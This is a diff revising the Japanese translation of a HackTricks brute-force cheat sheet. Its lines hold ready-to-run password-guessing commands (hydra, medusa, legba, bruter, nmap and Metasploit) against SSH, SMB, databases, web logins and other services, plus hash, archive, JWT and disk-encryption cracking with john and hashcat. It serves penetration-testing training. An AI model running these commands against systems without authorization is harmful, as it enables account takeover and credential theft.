@@ -1,10 +1,10 @@
-# ブルートフォース - チートシート
+# Brute Force - チートシート
 
 {{#include ../banners/hacktricks-training.md}}
 
-## デフォルトの資格情報
+## Default Credentials
 
-**使用されている技術のデフォルトの資格情報をGoogleで検索**するか、**これらのリンクを試してください**：
+**Search in google** を使って、使用している技術の default credentials を検索するか、**これらのリンクを試す**：
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -21,7 +21,7 @@
 
 ## **独自の辞書を作成する**
 
-ターゲットに関する情報をできるだけ多く集めて、カスタム辞書を生成します。役立つツール：
+対象に関する情報をできるだけ集め、カスタム辞書を作成する。役立つツール：
 
 ### Crunch
 ```bash
@@ -34,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### ウェブサイトベースのワードリスト
+### ウェブサイトベースのwordlists
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -47,13 +47,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-被害者に関する知識（名前、日付など）に基づいてパスワードを生成します。
+被害者に関する知識（名前、日付など）に基づいてパスワードを生成する
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-単語のセットを提供することができる単語リストジェネレーターツールで、与えられた単語から複数のバリエーションを作成し、特定のターゲットに関して使用するためのユニークで理想的な単語リストを作成することができます。
+wordlist generator toolで、単語のセットを入力することで、与えられた単語から複数のバリエーションを作成し、特定のターゲットに対して使用するためのユニークで最適なwordlistを生成できます。
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +74,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Wordlists
+### ワードリスト
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -87,9 +87,9 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Services
+## サービス
 
-サービス名のアルファベット順に並べられています。
+サービス名のアルファベット順に並んでいます。
 
 ### AFP
 ```bash
@@ -105,22 +105,28 @@ msf> run
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-### AMQP (ActiveMQ、RabbitMQ、Qpid、JORAM、Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM および Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
-### カッサンドラ
+### Cassandra
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
 # legba ScyllaDB / Apache Casandra
 legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
+```
+### ClickHouse
+
+[bruter](https://github.com/vflame6/bruter)
+```bash
+bruter clickhouse -u default -p passwords.txt localhost:9000
 ```
 ### CouchDB
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
-### Docker レジストリ
+### Docker Registry
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
@@ -135,11 +141,11 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### HTTPジェネリックブルート
+### HTTP Generic Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
-### HTTPベーシック認証
+### HTTP Basic Auth
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 # Use https-get mode for https
@@ -151,14 +157,14 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - ポストフォーム
+### HTTP - Post Form
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-For http**s** you have to change from "http-post-form" to "**https-post-form"**
+http**s** の場合は "http-post-form" を "**https-post-form"** に変更してください
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+### **HTTP - CMS --** (W)ordpress、(J)oomlaまたは(D)rupalまたは(M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
@@ -211,7 +217,7 @@ legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwor
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
 ```
-### モンゴ
+### Mongo
 ```bash
 nmap -sV --script mongodb-brute -n -p 27017 <IP>
 use auxiliary/scanner/mongodb/mongodb_login
@@ -278,11 +284,11 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**oracle_login**を**patator**で使用するには、**install**する必要があります:
+**oracle_login**を**patator**で使用するには、以下を**インストール**する必要があります:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**バージョン 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** および **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**バージョン 11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2、** および **11.2.0.3**):
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -309,7 +315,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-`.deb` パッケージを [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) からダウンロードしてインストールできます。
+インストール用の `.deb` パッケージは [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) からダウンロードできます。
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
@@ -368,6 +374,10 @@ nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
+### SMPP
+```bash
+bruter smpp -u smppclient1 -p passwords.txt localhost:2775
+```
 ### SMTP
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
@@ -400,17 +410,17 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### 弱いSSHキー / Debianの予測可能なPRNG
+#### 弱い SSH キー / Debian の予測可能な PRNG
 
-一部のシステムには、暗号材料を生成するために使用されるランダムシードに既知の欠陥があります。これにより、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)のようなツールでブルートフォース攻撃が可能な大幅に減少したキー空間が生じる可能性があります。弱いキーの事前生成されたセットも利用可能であり、例えば[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)があります。
+一部のシステムでは、暗号素材を生成する際に使用されるランダムシードに既知の欠陥があります。これによりキー空間が大幅に縮小され、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) のようなツールで bruteforced できる場合があります。事前に生成された弱いキーのセットも、[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) のように入手可能です。
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ および OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-STOMPテキストプロトコルは、**RabbitMQ、ActiveMQ、HornetQ、およびOpenMQなどの人気のあるメッセージキューサービスとのシームレスな通信と相互作用を可能にする**広く使用されているメッセージングプロトコルです。メッセージを交換し、さまざまなメッセージング操作を実行するための標準化された効率的なアプローチを提供します。
+STOMP テキストプロトコルは、RabbitMQ、ActiveMQ、HornetQ、OpenMQ などの一般的なメッセージキューイングサービスと**シームレスな通信および相互作用を可能にする**、広く使われているメッセージングプロトコルです。メッセージの交換や各種メッセージング操作を行うための、標準化され効率的な手法を提供します。
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
-### テルネット
+### Telnet
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
@@ -446,21 +456,21 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 ## ローカル
 
-### オンラインクラッキングデータベース
+### オンライン cracking データベース
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
 - [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (ハッシュ、WPA2キャプチャ、MSOffice、ZIP、PDFのアーカイブ...)
-- [https://crackstation.net/](https://crackstation.net) (ハッシュ)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+- [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (ハッシュとファイルハッシュ)
-- [https://hashes.org/search.php](https://hashes.org/search.php) (ハッシュ)
-- [https://www.cmd5.org/](https://www.cmd5.org) (ハッシュ)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
+- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
+- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-ハッシュをブルートフォースする前にこれを確認してください。
+Hash を brute force しようとする前に、これを確認してください。
 
 ### ZIP
 ```bash
@@ -478,10 +488,10 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### 既知平文ZIP攻撃
+#### Known plaintext zip attack
 
-暗号化されたZIP内に含まれるファイルの**平文**（または平文の一部）を知っている必要があります。暗号化されたZIP内に含まれる**ファイル名とファイルのサイズ**を確認するには、次のコマンドを実行します: **`7z l encrypted.zip`**\
-[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をリリースページからダウンロードしてください。
+暗号化されたzipの**内部に含まれるファイルのプレーンテキスト**（またはその一部）を知っている必要があります。次のコマンドを実行して、暗号化されたzipの**内部に含まれるファイル名とサイズ**を確認できます: **`7z l encrypted.zip`**\
+リリースページから [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) をダウンロードしてください.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -513,9 +523,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDFオーナーパスワード
+### PDF Owner Password
 
-PDFオーナーパスワードを解除するには、これを確認してください: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDF Owner password を crack するには、こちらを確認してください: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -529,7 +539,7 @@ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5h
 python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
 john jwt.john #It does not work with Kali-John
 ```
-### NTLM クラッキング
+### NTLM cracking
 ```bash
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
@@ -549,9 +559,9 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Luksの画像
+### Lucks イメージ
 
-#### 方法1
+#### 方法 1
 
 インストール: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
@@ -560,7 +570,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-#### 方法2
+#### 方法 2
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
@@ -569,7 +579,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-別のLuks BFチュートリアル: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+別の Luks BF チュートリアル: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -577,7 +587,7 @@ mount /dev/mapper/mylucksopen /mnt
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-### PGP/GPG プライベートキー
+### PGP/GPG Private key
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
@@ -586,16 +596,16 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 <figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>
 
-### DPAPI マスターキー
+### DPAPI Master Key
 
-[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) を使用し、その後 john を実行します。
+[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) を使い、その後 john を実行する
 
-### Open Office パスワード保護された列
+### Open Office のパスワード保護された列
 
-パスワードで保護された列を持つ xlsx ファイルがある場合、次のようにして保護を解除できます：
+列がパスワードで保護された xlsx ファイルがある場合、保護を解除できます:
 
-- **Google ドライブにアップロード**すると、パスワードが自動的に削除されます。
-- **手動で**それを**削除**するには：
+- **google drive にアップロードする** とパスワードは自動的に削除されます
+- それを**解除**するには**手動で**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -604,7 +614,7 @@ hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UV
 # Remove that line and rezip the file
 zip -r file.xls .
 ```
-### PFX証明書
+### PFX 証明書
 ```bash
 # From https://github.com/Ridter/p12tool
 ./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
@@ -613,47 +623,47 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
 ## ツール
 
-**ハッシュの例:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
+**Hash の例:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
-### ハッシュ識別子
+### Hash-identifier
 ```bash
 hash-identifier
 > <HASH>
 ```
-### Wordlists
+### ワードリスト
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Wordlist Generation Tools**
+### **ワードリスト生成ツール**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 高度なキーボードウォークジェネレーターで、設定可能なベース文字、キーマップ、ルートを持っています。
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 設定可能な base chars、keymap、routes を持つ高度な keyboard-walk ジェネレータ。
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
-### John mutation
+### John のミューテーション
 
-_read_ **/etc/john/john.conf** _を読み込み、設定します_
+_**/etc/john/john.conf**_ を読み、設定してください
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat攻撃
+#### Hashcat attacks
 
-- **ワードリスト攻撃** (`-a 0`) ルール付き
+- **Wordlist attack** (`-a 0`) で rules を使用
 
-**Hashcat** にはすでに **ルールを含むフォルダー** が付属していますが、[**他の興味深いルールはここで見つけることができます**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
+**Hashcat** にはすでに **rulesを含むフォルダ** が同梱されていますが、[**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules) も見つけることができます。
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-- **Wordlist combinator** 攻撃
+- **Wordlist combinator** attack
 
-hashcatを使用して**2つのワードリストを1つに結合**することが可能です。\
-リスト1に単語**"hello"**が含まれ、2番目のリストに単語**"world"**と**"earth"**の2行が含まれている場合、`helloworld`と`helloearth`が生成されます。
+hashcat を使うと、**combine 2 wordlists into 1** が可能です.\
+もし list 1 に単語 **"hello"** が含まれ、2 番目のリストに **"world"** と **"earth"** の 2 行が含まれている場合、`helloworld` と `helloearth` が生成されます。
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -664,7 +674,7 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 ## hello-earth!
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
-- **マスク攻撃** (`-a 3`)
+- **Mask attack** (`-a 3`)
 ```bash
 # Mask attack with simple mask
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
@@ -696,7 +706,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-- ワードリスト + マスク (`-a 6`) / マスク + ワードリスト (`-a 7`) 攻撃
+- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) 攻撃
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -704,23 +714,23 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Hashcat モード
+#### Hashcat のモード
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Linuxハッシュのクラック - /etc/shadowファイル
+Cracking Linux Hashes - /etc/shadow ファイル
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Windowsハッシュのクラッキング
+Cracking Windows Hashes
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-一般的なアプリケーションハッシュのクラッキング
+一般的なアプリケーション Hashes の Cracking
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
